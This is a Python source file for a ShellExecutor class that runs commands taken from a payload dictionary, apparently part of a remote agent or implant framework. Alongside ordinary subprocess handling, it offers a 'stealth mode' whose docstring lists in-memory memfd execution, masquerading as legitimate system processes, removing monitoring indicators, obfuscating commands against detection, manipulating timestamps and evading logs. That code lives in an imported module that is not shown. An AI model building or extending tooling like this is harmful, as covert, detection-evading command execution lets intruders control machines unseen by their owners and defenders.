import asyncio
import subprocess
import os
import time
from typing import Optional, Tuple, Dict, Any, Callable
import logging

from .stealth_executor import StealthExecutor, StealthConfig, create_stealth_executor


class ShellExecutor:
    def __init__(self, stealth_mode: bool = False, stealth_config: StealthConfig = None):
        self.stealth_mode = stealth_mode
        self.logger = logging.getLogger("ShellExecutor")
        
        # Initialize stealth executor if stealth mode enabled
        self._stealth_executor: Optional[StealthExecutor] = None
        if stealth_mode:
            if stealth_config:
                self._stealth_executor = StealthExecutor(stealth_config)
            else:
                self._stealth_executor = create_stealth_executor(aggressive=False)

    async def run(self, payload: Dict[str, Any], progress_callback: Optional[Callable] = None) -> Tuple[str, str, int, float]:
        """
        Асинхронно выполняет команду через обычный shell или stealth-заглушку.
        
        Args:
            payload: Словарь с параметрами команды, должен содержать ключ "cmd"
            progress_callback: Опциональный callback для отправки промежуточных статусов
            
        Returns:
            Tuple[str, str, int, float]: (stdout, stderr, returncode, execution_time)
        """
        cmd = payload.get("cmd")
        if not cmd:
            return "", "Payload missing cmd", 1, 0.0
        
        # Get working directory from payload
        working_directory = payload.get("working_directory")
        
        # Start timing
        start_time = time.time()
        
        if self.stealth_mode:
            result = await self.run_stealth(cmd, working_directory)
            execution_time = time.time() - start_time
            return result[0], result[1], result[2], execution_time
        
        try:
            # Create subprocess with working directory if specified
            kwargs = {
                "stdout": asyncio.subprocess.PIPE,
                "stderr": asyncio.subprocess.PIPE
            }
            
            if working_directory:
                kwargs["cwd"] = working_directory
                self.logger.info(f"Executing command in directory: {working_directory}")
            
            process = await asyncio.create_subprocess_shell(cmd, **kwargs)
            
            # Отправляем промежуточный статус если есть callback
            if progress_callback:
                await progress_callback(50, {})
            
            stdout, stderr = await process.communicate()
            execution_time = time.time() - start_time
            
            return stdout.decode(), stderr.decode(), process.returncode, execution_time
        except Exception as e:
            execution_time = time.time() - start_time
            return "", str(e), 1, execution_time

    async def run_stealth(self, cmd: str, working_directory: Optional[str] = None, timeout: Optional[float] = None) -> Tuple[str, str, int]:
        """
        Execute command in stealth mode using advanced evasion techniques.
        
        Stealth techniques applied:
        - Memfd execution (Linux) - execute from memory without touching disk
        - Process masquerading - disguise as legitimate system process
        - Environment sanitization - remove monitoring indicators
        - Command obfuscation - break pattern-based detection
        - Timestamp manipulation - avoid forensic detection
        - Log evasion - minimize logging footprint
        
        Args:
            cmd: Command to execute
            working_directory: Working directory for execution
            timeout: Execution timeout in seconds
            
        Returns:
            Tuple[str, str, int]: (stdout, stderr, returncode)
        """
        if self._stealth_executor is None:
            self._stealth_executor = create_stealth_executor(aggressive=False)
        
        self.logger.debug(f"[STEALTH MODE] Executing: {cmd[:50]}... in {working_directory or 'current dir'}")
        
        try:
            stdout, stderr, returncode = await self._stealth_executor.execute(
                cmd=cmd,
                working_directory=working_directory,
                timeout=timeout
            )
            
            return stdout, stderr, returncode
            
        except Exception as e:
            self.logger.error(f"[STEALTH MODE] Execution failed: {e}")
            return "", str(e), 1
    
    def get_stealth_capabilities(self) -> Dict[str, Any]:
        """
        Get available stealth capabilities on this system.
        
        Returns:
            Dict describing available stealth features
        """
        if self._stealth_executor is None:
            self._stealth_executor = create_stealth_executor(aggressive=False)
        
        return self._stealth_executor.get_capabilities()
    
    def stealth_cleanup(self) -> Dict[str, bool]:
        """
        Perform post-execution cleanup for stealth operations.
        
        Returns:
            Dict with cleanup results
        """
        if self._stealth_executor is None:
            return {"error": "Stealth executor not initialized"}
        
        return self._stealth_executor.cleanup()

    def run_sync(self, cmd: str, shell: bool = False, check: bool = False, 
                timeout: Optional[int] = None, env: Optional[Dict[str, str]] = None,
                stderr_to_devnull: bool = False, working_directory: Optional[str] = None) -> Tuple[str, str, int, float]:
        """
        Синхронно выполняет команду через subprocess.run.
        
        Args:
            cmd: Команда для выполнения (строка или список)
            shell: Использовать ли shell для выполнения команды
            check: Вызывать ли исключение при ненулевом коде возврата
            timeout: Таймаут выполнения команды в секундах
            env: Переменные окружения для команды
            stderr_to_devnull: Перенаправлять ли stderr в /dev/null
            working_directory: Рабочая директория для выполнения команды
            
        Returns:
            Tuple[str, str, int, float]: (stdout, stderr, returncode, execution_time)
        """
        start_time = time.time()
        try:
            kwargs = {
                "shell": shell,
                "check": check,
                "capture_output": True,
                "text": True,
                "env": env
            }
            
            if timeout is not None:
                kwargs["timeout"] = timeout
                
            if stderr_to_devnull:
                kwargs["stderr"] = subprocess.DEVNULL
                
            if working_directory:
                kwargs["cwd"] = working_directory
                
            result = subprocess.run(cmd, **kwargs)
            execution_time = time.time() - start_time
            return result.stdout, result.stderr, result.returncode, execution_time
        except subprocess.TimeoutExpired:
            execution_time = time.time() - start_time
            return "", "Command timed out", 1, execution_time
        except subprocess.CalledProcessError as e:
            execution_time = time.time() - start_time
            if check:
                raise
            return e.stdout or "", e.stderr or "", e.returncode, execution_time
        except Exception as e:
            execution_time = time.time() - start_time
            return "", str(e), 1, execution_time
